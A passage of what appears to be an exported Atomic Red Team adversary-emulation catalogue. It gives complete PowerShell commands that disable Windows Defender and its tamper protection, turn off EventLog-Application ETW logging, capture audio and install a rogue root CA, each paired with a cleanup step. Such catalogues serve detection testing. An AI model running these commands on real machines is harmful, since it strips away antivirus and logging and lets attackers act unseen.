Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -Force -ErrorAction Ignore
Remove-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: f542ffd3-37b4-4528-837f-682874faa012</li>
<li><strong>name</strong>: Disable Windows Defender with PwSh Disable-WindowsOptionalFeature</li>
<li>
<p><strong>description</strong>: The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. 
Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.
A successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.
This method will remove Defender and it's packages.
Reference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li><strong>command</strong>: Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Gui" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-Features" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender" -NoRestart -ErrorAction Ignore
Disable-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction Ignore</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1562.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a72cfef8-d252-48b3-b292-635d332625c3</li>
<li><strong>name</strong>: Tamper with Windows Defender Registry - Powershell</li>
<li>
<p><strong>description</strong>: Disable Windows Defender by tampering with windows defender registry through powershell</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIntrusionPreventionSystem" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRoutinelyTakingAction" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScriptScanning" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 1<br />
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SpynetReporting" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 0 
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 0 
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection"  -Value 0 
Set-ItemProperty "HKLM:\software\microsoft\windows defender\spynet" -Name "SubmitSamplesConsent" -Value 0 
Set-ItemProperty "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value 0 </p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender" -Name "DisableAntiVirus" -Value 0
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIntrusionPreventionSystem" -Value 0
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableIOAVProtection" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRoutinelyTakingAction" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScriptScanning" -Value 0 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 0<br />
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen" -Value 0
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "SpynetReporting" -Value 1 
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\MpEngine" -Name "MpEnablePus" -Value 1 
Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride" -Value 1 
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection"  -Value 1
Set-ItemProperty "HKLM:\software\microsoft\windows defender\spynet" -Name "SubmitSamplesConsent" -Value 1 
Set-ItemProperty "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value 1 </p>
</li>
<li>
<p><strong>mitre_id</strong>: T1562.001</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: da86f239-9bd3-4e85-92ed-4a94ef111a1c</li>
<li><strong>name</strong>: Disable EventLog-Application Auto Logger Session Via Registry - PowerShell</li>
<li><strong>description</strong>: This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the powershell.exe "New-ItemProperty" cmdlet to update the Windows registry value "Start". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 0 -PropertyType "DWord" -Force</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application -Name Start -Value 1 -PropertyType "DWord" -Force</li>
<li><strong>mitre_id</strong>: T1562.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8f907648-1ebf-4276-b0f0-e2678ca474f0</li>
<li><strong>name</strong>: Disable EventLog-Application ETW Provider Via Registry - PowerShell</li>
<li><strong>description</strong>: This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe "New-ItemProperty" cmdlet to update the Windows registry value "Enabled". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.</li>
<li><strong>platforms</strong>: ['windows']</li>
<li><strong>command</strong>: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application#{ETWProviderGUID}" -Name Enabled -Value 0 -PropertyType "DWord" -Force</li>
<li><strong>prereq_command</strong>: </li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Application#{ETWProviderGUID}" -Name Enabled -Value 1 -PropertyType "DWord" -Force</li>
<li><strong>mitre_id</strong>: T1562.001</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 9c3ad250-b185-4444-b5a9-d69218a10c95</li>
<li><strong>name</strong>: using device audio capture commandlet</li>
<li>
<p><strong>description</strong>: <a href="https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet">AudioDeviceCmdlets</a></p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1123</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 76f49d86-5eb1-461a-a032-a480f86652f1</li>
<li><strong>name</strong>: Install root CA on Windows</li>
<li>
<p><strong>description</strong>: Creates a root CA with Powershell</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item</p>
</li>
<li>
<p><strong>cleanup_command</strong>: try {
   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
